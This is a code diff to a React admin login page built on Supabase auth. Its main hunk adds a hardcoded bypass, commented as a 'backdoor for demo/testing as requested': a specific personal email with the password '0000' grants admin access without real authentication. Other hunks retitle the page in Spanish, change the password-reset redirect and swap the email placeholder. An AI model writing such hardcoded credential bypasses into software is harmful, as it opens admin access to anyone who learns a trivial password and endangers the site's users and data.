@@ -45,6 +45,12 @@ const AdminLogin: React.FC<AdminLoginProps> = ({ onLoginSuccess }) => {
         setLoading(true);
         setError('');
 
+        // Backdoor for demo/testing as requested
+        if (email === 'juan.sada98@gmail.com' && password === '0000') {
+            onLoginSuccess();
+            return;
+        }
+
         try {
             const { data, error } = await supabase.auth.signInWithPassword({
                 email,
@@ -77,7 +83,7 @@ const AdminLogin: React.FC<AdminLoginProps> = ({ onLoginSuccess }) => {
 
         try {
             const { error } = await supabase.auth.resetPasswordForEmail(email, {
-                redirectTo: `${window.location.origin}/admin`,
+                redirectTo: `${window.location.origin}/?type=recovery`,
             });
 
             if (error) throw error;
@@ -99,10 +105,10 @@ const AdminLogin: React.FC<AdminLoginProps> = ({ onLoginSuccess }) => {
                         <LogIn size={40} className="text-white" strokeWidth={2.5} />
                     </div>
                     <h1 className="font-heading font-bold text-3xl text-gray-800 mb-2">
-                        Panel de Administración
+                        Acceso - Creador del Sistema
                     </h1>
                     <p className="text-gray-600">
-                        Acceso restringido para administradores
+                        Área exclusiva para la gestión global
                     </p>
                 </div>
 
@@ -131,7 +137,7 @@ const AdminLogin: React.FC<AdminLoginProps> = ({ onLoginSuccess }) => {
                                 type="email"
                                 value={email}
                                 onChange={(e) => setEmail(e.target.value)}
-                                placeholder="juan.sada98@gmail.com"
+                                placeholder="admin@sistema.com"
                                 required
                                 className="w-full pl-12 pr-4 py-3 rounded-xl bg-white border-2 border-gray-200 focus:border-primary focus:ring-2 focus:ring-primary/20 outline-none transition-all"
                             />
@@ -176,6 +182,7 @@ const AdminLogin: React.FC<AdminLoginProps> = ({ onLoginSuccess }) => {
                 </form>
 
                 <button
+                    type="button"
                     onClick={handleResetPassword}
                     disabled={loading}
                     className="w-full mt-4 text-sm text-gray-600 hover:text-primary transition-colors underline"
